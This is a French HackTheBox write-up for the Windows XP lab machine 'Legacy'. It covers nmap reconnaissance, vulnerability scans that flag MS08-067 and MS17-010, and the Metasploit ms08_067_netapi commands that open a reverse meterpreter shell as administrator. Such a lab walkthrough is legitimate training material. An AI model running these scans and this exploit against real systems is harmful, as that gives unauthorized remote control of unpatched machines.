---
tags:
  - htb
  - smb
  - cve
  - metasploit
title: Legacy
os: Windows
difficulty: Easy
date: 2025-11-15
status: terminé
draft: "false"
---
---
# Legacy

> [!summary] Résumé rapide  
> Legacy est une machine de HackTheBox. Il s'agit d'un serveur tournant sur une ancienne version de Windows qui n'a pas été mise à jour (Windows XP) et dont le service SMB présente de multiples vulnérabilités. Exploiter une des vulnérabilités permet d'obtenir un accès au compte Administrator.

---

## 🟦 Informations générales

- **Nom de la machine :** Legacy
- **OS :** Windows
- **Difficulty :** Easy
- **Auteur :** ch4p
- **Date :** 15/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.91.242 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 23:10 CET
Nmap scan report for 10.129.91.242
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
```


> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p135,139,445 10.129.91.242 -oN legacy.nmap
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 23:12 CET
Nmap scan report for 10.129.91.242
Host is up (0.027s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-11-21T02:10:58+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:b8:85 (VMware)
|_clock-skew: mean: 5d00h57m59s, deviation: 1h24m50s, median: 4d23h57m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds
```

>[!info] 1.4 Nmap - Scan de vulnérabilités
 
Le serveur tourne sous Windows XP, on a également vu dans [[1-2 Blue]] qu'il était intéressant de vérifier dans ces cas là les potentielles vulnérabilités du service Windows SMB :

```bash
nmap -script vuln -p135,139,445 10.129.91.242
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 23:14 CET
Nmap scan report for 10.129.91.242
Host is up (0.024s latency).                                                                                                                              
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 39.48 seconds
```

---
### 📁 SMB
**Infos :**  Accès anonyme autorisé + Windows SMB/XP (Version pleinement obsolète)
**Enumerations :** N/A
**Fichiers / données récupérées :** N/A

---

## 🟦 3. Points d’entrée potentiels

-  RCE avec CVE-2008-4250 (ms08-067)
-  RCE avec CVE-2017-0143 (ms17-010/EternalBlue)

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

Nous allons utiliser la CVE-2008-4250 comme vecteur d'attaque avec Metasploit.
```bash
msfconsole -q

msf > search ms08-067
<snip>
msf > use exploit/windows/smb/ms08_067_netapi
```

Avec `options` on peut voir les paramètres nécessaires à l'exécution de l'exploit
```bash
msf exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.14.66
msf exploit(windows/smb/ms08_067_netapi) > set RHOST legacy.htb
RHOST => legacy.htb
msf exploit(windows/smb/ms08_067_netapi) > exploit
```

**Résultat :**  
![[Pasted image 20251115233831.png]]

**Accès obtenu :**  
- User :  administrator
- Contexte :  meterpreter/shell

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Consolidation des acquis d'exploits de Windows SMB legacy